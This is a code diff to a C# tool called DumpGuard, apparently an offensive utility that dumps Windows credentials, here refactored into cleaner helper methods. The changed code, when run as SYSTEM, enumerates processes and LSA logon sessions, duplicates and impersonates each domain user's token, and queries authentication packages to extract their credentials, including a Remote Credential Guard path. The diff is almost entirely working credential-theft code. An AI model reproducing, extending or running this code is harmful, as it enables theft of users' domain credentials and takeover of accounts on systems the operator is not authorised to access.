@@ -97,16 +97,24 @@ namespace DumpGuard
                 Console.WriteLine("Please provide a mode with the /mode:[self|all] parameter.");
             else
             {
-                if (mode.Equals("self"))
-                    DumpCredentialsSelf(arguments);
-                else if (mode.Equals("all"))
-                    DumpCredentialsAll(arguments);
-                else
-                    Console.WriteLine($"No action could be performed for mode '{mode}'.");
+                switch (mode)
+                {
+                    case "self":
+                        DumpCredentialRemoteCredentialGuard(arguments);
+                        break;
+
+                    case "all":
+                        DumpCredentialsAll(arguments);
+                        break;
+
+                    default:
+                        Console.WriteLine($"No action could be performed for mode '{mode}'.");
+                        break;
+                }
             }
         }
 
-        static void DumpCredentialsSelf(Dictionary<string, string> arguments)
+        static void DumpCredentialRemoteCredentialGuard(Dictionary<string, string> arguments)
         {
             if (!arguments.TryGetValue("/domain", out string domain) || !arguments.TryGetValue("/username", out string username) || !arguments.TryGetValue("/password", out string password))
                 Console.WriteLine("You must supply the following arguments: /domain:xxx, /username:xxx, and /password:xxx");
@@ -168,12 +176,12 @@ namespace DumpGuard
             if (!WindowsIdentity.GetCurrent().IsSystem)
                 Console.WriteLine("Must run as SYSTEM to dump all.");
             else if (arguments.ContainsKey("/domain") && arguments.ContainsKey("/username") & arguments.ContainsKey("/password"))
-                DumpCredentialsAllRemoteCredentialGuard(arguments);
+                DumpCredentialsRemoteCredentialGuardAll(arguments);
             else
-                DumpCredentialsAllNtlm(arguments);
+                DumpCredentialsMicrosoftV1All();
         }
 
-        static void DumpCredentialsAllRemoteCredentialGuard(Dictionary<string, string> arguments)
+        static void DumpCredentialsRemoteCredentialGuardAll(Dictionary<string, string> arguments)
         {
             var dumped_identities = new HashSet<string>();
 
@@ -190,112 +198,96 @@ namespace DumpGuard
                     continue; // Some processes raise exceptions when we try to fetch the handle
                 }
 
-                var ProcessToken = IntPtr.Zero;
+                var process_token = IntPtr.Zero;
 
                 try
                 {
-                    if (!Interop.OpenProcessToken(process_handle, 0x0008 /* TOKEN_QUERY */ | 0x0002 /* TOKEN_DUPLICATE */, out ProcessToken))
+                    if (!Interop.OpenProcessToken(process_handle, 0x0008 /* TOKEN_QUERY */ | 0x0002 /* TOKEN_DUPLICATE */, out process_token))
                         throw new Exception($"OpenProcessToken failed with error: {Marshal.GetLastWin32Error()}");
 
-                    var identity = new WindowsIdentity(ProcessToken);
+                    var identity = new WindowsIdentity(process_token);
                     var identity_sid = identity.User?.ToString();
 
                     if (!string.IsNullOrEmpty(identity_sid) && !dumped_identities.Contains(identity_sid) && identity_sid.StartsWith("S-1-5-21-"))
                     {
-                        var DuplicatedToken = IntPtr.Zero;
-
-                        try
+                        ImpersonateTokenHandle(process_token, () =>
                         {
-                            if (!Interop.DuplicateToken(ProcessToken, 2 /* SecurityImpersonation */, out DuplicatedToken))
-                                throw new Exception($"DuplicateToken failed with error: {Marshal.GetLastWin32Error()}");
-
-                            if (!Interop.ImpersonateLoggedOnUser(DuplicatedToken))
-                                throw new Exception($"ImpersonateLoggedOnUser failed with error: {Marshal.GetLastWin32Error()}");
-
                             try
                             {
-                                DumpCredentialsSelf(arguments);
+                                DumpCredentialRemoteCredentialGuard(arguments);
                             }
                             catch (Exception e)
                             {
                                 Console.WriteLine($"Failed to dump credentials for '{identity.Name}': {e.Message}");
                             }
-                            finally
-                            {
-                                Interop.RevertToSelf();
-                            }
 
                             dumped_identities.Add(identity_sid);
-                        }
-                        finally
-                        {
-                            if (DuplicatedToken != IntPtr.Zero)
-                                Interop.CloseHandle(DuplicatedToken);
-                        }
+                        });
                     }
                 }
                 finally
                 {
-                    if (ProcessToken != IntPtr.Zero)
-                        Interop.CloseHandle(ProcessToken);
+                    if (process_token != IntPtr.Zero)
+                        Interop.CloseHandle(process_token);
                 }
             }
         }
 
-        static void DumpCredentialsAllNtlm(Dictionary<string, string> arguments)
+        static void DumpCredentialsMicrosoftV1All()
         {
+            string SidToString(IntPtr SidPtr)
+            {
+                string sid_string = null;
+
+                if (SidPtr != IntPtr.Zero && Interop.ConvertSidToStringSid(SidPtr, out IntPtr StringSid))
+                {
+                    sid_string = Marshal.PtrToStringAuto(StringSid);
+                    Interop.LocalFree(StringSid);
+                }
+
+                return sid_string;
+            }
+
+            var sessions = new List<Tuple<string, LUID>>();
             var status = 0;
 
-            IEnumerable<Tuple<string, LUID>> GetLogonSessions()
+            if ((status = Interop.LsaEnumerateLogonSessions(out int session_count, out var session_list_ptr)) < 0)
+                Console.WriteLine($"LsaEnumerateLogonSessions failed with error: {status:x}.");
+            else
             {
-                string SidToString(IntPtr SidPtr)
+                for (int i = 0; i < session_count; i++)
                 {
-                    string sid_string = null;
+                    var luid_ptr = session_list_ptr + (i * Marshal.SizeOf<LUID>());
+                    var luid = Marshal.PtrToStructure<LUID>(luid_ptr);
 
-                    if (SidPtr != IntPtr.Zero && Interop.ConvertSidToStringSid(SidPtr, out IntPtr StringSid))
+                    if ((status = Interop.LsaGetLogonSessionData(luid_ptr, out var session_data_ptr)) < 0)
+                        Console.WriteLine($"LsaGetLogonSessionData failed with error: {status:x}.");
+                    else
                     {
-                        sid_string = Marshal.PtrToStringAuto(StringSid);
-                        Interop.LocalFree(StringSid);
-                    }
+                        var session_data = Marshal.PtrToStructure<SECURITY_LOGON_SESSION_DATA>(session_data_ptr);
 
-                    return sid_string;
-                }
-
-                var result = new List<Tuple<string, LUID>>();
-
-                if ((status = Interop.LsaEnumerateLogonSessions(out int session_count, out var session_list_ptr)) < 0)
-                    Console.WriteLine($"LsaEnumerateLogonSessions failed with error: {status:x}.");
-                else
-                {
-                    for (int i = 0; i < session_count; i++)
-                    {
-                        var luid_ptr = session_list_ptr + (i * Marshal.SizeOf<LUID>());
-                        var luid = Marshal.PtrToStructure<LUID>(luid_ptr);
-
-                        if ((status = Interop.LsaGetLogonSessionData(luid_ptr, out var session_data_ptr)) < 0)
-                            Console.WriteLine($"LsaGetLogonSessionData failed with error: {status:x}.");
-                        else
+                        if (SidToString(session_data.Sid)?.StartsWith("S-1-5-21-") == true)
                         {
-                            var session_data = Marshal.PtrToStructure<SECURITY_LOGON_SESSION_DATA>(session_data_ptr);
+                            var domain = session_data.LogonDomain.ToString();
+                            var username = session_data.UserName.ToString();
 
-                            if (SidToString(session_data.Sid)?.StartsWith("S-1-5-21-") == true)
-                            {
-                                var domain = session_data.LogonDomain.ToString();
-                                var username = session_data.UserName.ToString();
-
-                                if (!string.IsNullOrEmpty(domain) && !string.IsNullOrEmpty(username))
-                                    result.Add(new Tuple<string, LUID>($"{domain}\\{username}", luid));
-                            }
-
-                            Interop.LsaFreeReturnBuffer(session_data_ptr);
+                            if (!string.IsNullOrEmpty(domain) && !string.IsNullOrEmpty(username))
+                                sessions.Add(new Tuple<string, LUID>($"{domain}\\{username}", luid));
                         }
-                    }
 
-                    Interop.LsaFreeReturnBuffer(session_list_ptr);
+                        Interop.LsaFreeReturnBuffer(session_data_ptr);
+                    }
                 }
 
-                return result;
+                Interop.LsaFreeReturnBuffer(session_list_ptr);
             }
+
+            DumpCredentialsMicrosoftV1(sessions);
+        }
+
+        static void DumpCredentialsMicrosoftV1(IEnumerable<Tuple<string, LUID>> sessions)
+        {
+            var status = 0;
 
             if ((status = Interop.LsaConnectUntrusted(out IntPtr LsaHandle)) < 0)
                 Console.WriteLine($"LsaConnectUntrusted failed with error: {status:x}");
@@ -316,7 +308,7 @@ namespace DumpGuard
 
                     var dumped_creds = new HashSet<string>();
 
-                    foreach (var session in GetLogonSessions())
+                    foreach (var session in sessions)
                     {
                         request.LogonId = session.Item2;
 
@@ -356,6 +348,35 @@ namespace DumpGuard
 
                 PackageName.Dispose();
                 Interop.LsaDeregisterLogonProcess(LsaHandle);
+            }
+        }
+
+        static void ImpersonateTokenHandle(IntPtr token_handle, Action action)
+        {
+            var duplicated_token = IntPtr.Zero;
+
+            try
+            {
+                if (!Interop.DuplicateToken(token_handle, 2 /* SecurityImpersonation */, out duplicated_token))
+                    throw new Exception($"DuplicateToken failed with error: {Marshal.GetLastWin32Error()}");
+
+                if (!Interop.ImpersonateLoggedOnUser(duplicated_token))
+                    throw new Exception($"ImpersonateLoggedOnUser failed with error: {Marshal.GetLastWin32Error()}");
+
+                try
+                {
+                    if (action != null)
+                        action();
+                }
+                finally
+                {
+                    Interop.RevertToSelf();
+                }
+            }
+            finally
+            {
+                if (duplicated_token != IntPtr.Zero)
+                    Interop.CloseHandle(duplicated_token);
             }
         }
     }
